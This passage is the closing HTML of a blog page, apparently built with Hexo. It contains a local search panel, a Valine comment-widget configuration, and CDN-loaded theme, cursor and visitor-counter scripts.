id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '9RpBEBK73wLE1cR6CXCiAnjb-gzGzoHsz',
+      appKey: 'e737ft98xMdDGv5szsTCmX7i',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script data-pjax src="https://cdn.jsdelivr.net/gh/tzy13755126023/tzy13755126023.github.io/js/chocolate.js"></script> <script async src="https://cdn.jsdelivr.net/gh/tzy13755126023/tzy13755126023.github.io/js/cursor.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
